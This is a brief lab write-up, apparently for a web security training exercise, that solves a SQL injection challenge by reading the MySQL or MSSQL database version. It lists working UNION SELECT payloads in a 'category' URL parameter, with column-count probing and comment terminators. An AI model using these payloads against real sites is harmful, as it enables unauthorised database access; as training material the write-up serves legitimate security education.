# lab-querying-database-version-mysql-microsoft

## Solution 1 (MySQL)
Comment sign is "#" (%23 url-encoded).

`/filter?category=Lifestyle'+UNION+SELECT+NULL%23`: Internal Server Error

`/filter?category=Lifestyle'+UNION+SELECT+NULL,+NULL%23`: Ok (2 columns)

`/filter?category=Lifestyle'+UNION+SELECT+@@version,+NULL%23`: Solved

## Solution 2 (MySQL & MSSQL)
MySQL comment has the space after double dash (-- something):

`/filter?category=Pets'+UNION+SELECT+@@version,+NULL--+1`: Solved
